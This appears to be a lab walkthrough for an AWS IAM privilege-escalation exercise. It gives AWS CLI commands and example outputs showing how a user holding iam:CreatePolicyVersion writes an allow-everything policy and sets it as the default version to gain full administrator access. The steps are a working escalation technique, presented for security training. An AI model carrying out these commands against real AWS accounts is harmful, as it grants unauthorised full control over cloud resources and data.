# Steps for privesc1-CreateNewPolicyVersion

## 

1. View the user's current attached policies.
 
```
aws iam list-attached-user-policies --user-name privesc1-CreateNewPolicyVersion-user
```

> Example: Output:
```
{
    "AttachedPolicies": [
        {
            "PolicyName": "privesc1-CreateNewPolicyVersion",
            "PolicyArn": "arn:aws:iam::[REDACTED]:policy/privesc1-CreateNewPolicyVersion"
        }
    ]
}
```

2. List the policy versions referencing the Policy ARN you obtained above.

```
aws iam list-policy-versions --policy-arn <POLICY_ARN>
```

> Example Output:
```
{
    "Versions": [
        {
            "VersionId": "v1",
            "IsDefaultVersion": false,
            "CreateDate": "2022-05-09T03:28:11+00:00"
        }
    ]
}
```

3. Get the Policy details of the specifc version.

```
aws iam get-policy-version --policy-arn <POLICY_ARN> --version-id <VERSION_ID>
```

> Example Output:
```
{
    "PolicyVersion": {
        "Document": {
            "Statement": [
                {
                    "Action": "iam:CreatePolicyVersion",
                    "Effect": "Allow",
                    "Resource": "*"
                }
            ],
            "Version": "2012-10-17"
        },
        "VersionId": "v1",
        "IsDefaultVersion": true,
        "CreateDate": "2022-05-09T03:28:11+00:00"
    }
}
```

4. Create a new policy document that permits all AWS actions:

```
cat <<EOF > admin_policy.json
{
   "Version": "2012-10-17",
   "Statement": [
       {
           "Sid": "AllowEverything",
           "Effect": "Allow",
           "Action": "*",
           "Resource": "*"
       }
    ]
}
EOF
```

5. Create a new version of the policy, based on the new policy document, and set as default for the user.  Optionally you can add --profile flag.
```
aws iam create-policy-version --policy-arn <POLICY_ARN> --policy-document file://admin_policy.json --set-as-default
```

> Example Output:
```
{
    "PolicyVersion": {
        "VersionId": "v2",
        "IsDefaultVersion": true,
        "CreateDate": "2022-05-09T04:52:13+00:00"
    }
}
```

6. Re-list policy versions and you should see the new version added and also set as new default.

```
aws iam list-policy-versions --policy-arn <POLICY_ARN>
```

> Example Output:
```
{
    "Versions": [
        {
            "VersionId": "v2",
            "IsDefaultVersion": true,
            "CreateDate": "2022-05-09T04:52:13+00:00"
        },
        {
            "VersionId": "v1",
            "IsDefaultVersion": false,
            "CreateDate": "2022-05-09T03:28:11+00:00"
        }
    ]
}
```

7. View the details of the new version of the policy.

```
aws iam get-policy-version --policy-arn <POLICY_ARN> --version-id v2
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Sid": "AllowEverything",
                    "Effect": "Allow",
                    "Action": "*",
                    "Resource": "*"
                }
            ]
        },
        "VersionId": "v2",
        "IsDefaultVersion": true,
        "CreateDate": "2022-05-09T04:52:13+00:00"
    }
}
```
